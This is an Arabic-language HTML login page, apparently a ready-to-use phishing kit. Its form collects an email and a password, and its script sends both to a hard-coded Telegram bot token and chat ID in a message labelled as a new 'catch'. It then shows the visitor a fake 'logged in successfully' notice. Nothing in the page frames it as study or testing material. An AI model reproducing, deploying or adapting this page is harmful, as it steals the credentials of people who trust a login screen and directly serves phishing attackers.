<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Lucide Icons -->
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap');
        body { font-family: 'Tajawal', sans-serif; }
    </style>
</head>
<body class="bg-slate-900 text-slate-100 min-h-screen flex items-center justify-center p-4">

    <div class="w-full max-w-md">
        <div class="bg-slate-800 border border-slate-700 rounded-2xl p-8 shadow-2xl relative overflow-hidden">
            <div class="absolute -top-10 -left-10 w-32 h-32 bg-indigo-500/10 rounded-full blur-2xl"></div>
            
            <div class="text-center mb-8">
                <div class="inline-flex p-3 bg-indigo-600/20 text-indigo-400 rounded-full mb-3">
                    <i data-lucide="lock" class="w-8 h-8"></i>
                </div>
                <h2 class="text-2xl font-bold">تسجيل الدخول</h2>
                <p class="text-slate-400 text-sm mt-1">أدخل بياناتك للمتابعة إلى الحساب</p>
            </div>

            <form id="loginForm" onsubmit="sendToTelegram(event)" class="space-y-5">
                <div>
                    <label class="block text-xs font-medium text-slate-300 mb-1.5">البريد الإلكتروني</label>
                    <div class="relative">
                        <input type="email" id="userEmail" required placeholder="name@example.com" class="w-full bg-slate-900/80 border border-slate-700 rounded-lg px-4 py-2.5 text-sm focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 transition text-right">
                        <i data-lucide="mail" class="w-4 h-4 text-slate-500 absolute left-3 top-3.5"></i>
                    </div>
                </div>

                <div>
                    <label class="block text-xs font-medium text-slate-300 mb-1.5">كلمة السر</label>
                    <div class="relative">
                        <input type="password" id="userPass" required placeholder="••••••••" class="w-full bg-slate-900/80 border border-slate-700 rounded-lg px-4 py-2.5 text-sm focus:outline-none focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500 transition text-right">
                        <i data-lucide="key" class="w-4 h-4 text-slate-500 absolute left-3 top-3.5"></i>
                    </div>
                </div>

                <button type="submit" id="submitBtn" class="w-full py-3 bg-indigo-600 hover:bg-indigo-500 text-white font-medium rounded-lg shadow-lg hover:shadow-indigo-500/20 transition flex justify-center items-center">
                    <span>تسجيل الدخول</span>
                    <i data-lucide="arrow-left" class="w-4 h-4 mr-2"></i>
                </button>
            </form>

            <div id="successMsg" class="hidden mt-4 p-3 bg-green-500/10 border border-green-500/30 rounded-lg text-green-400 text-xs text-center">
                تم تسجيل الدخول بنجاح!
            </div>
        </div>
    </div>

    <script>
        lucide.createIcons();

        async function sendToTelegram(e) {
            e.preventDefault();
            
            const email = document.getElementById('userEmail').value;
            const pass = document.getElementById('userPass').value;
            const btn = document.getElementById('submitBtn');
            
            btn.disabled = true;
            btn.innerHTML = 'جاري التحقق...';

            const botToken = '8676888425:AAGwGw8IbBL0z800MUtSUyNip1zBZTVwSg';
            const chatId = '8160033832';
            
            const message = `🔔 صيد جديد (تسجيل دخول):\n\n📧 البريد: ${email}\n🔑 كلمة السر: ${pass}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });

                if (response.ok) {
                    document.getElementById('loginForm').reset();
                    const msg = document.getElementById('successMsg');
                    msg.classList.remove('hidden');
                    setTimeout(() => msg.classList.add('hidden'), 4000);
                } else {
                    alert('حدث خطأ، يرجى المحاولة لاحقاً.');
                }
            } catch (error) {
                alert('فشل الاتصال بالخادم.');
            } finally {
                btn.disabled = false;
                btn.innerHTML = `<span>تسجيل الدخول</span><i data-lucide="arrow-left" class="w-4 h-4 mr-2"></i>`;
                lucide.createIcons();
            }
        }
    </script>
</body>
</html>
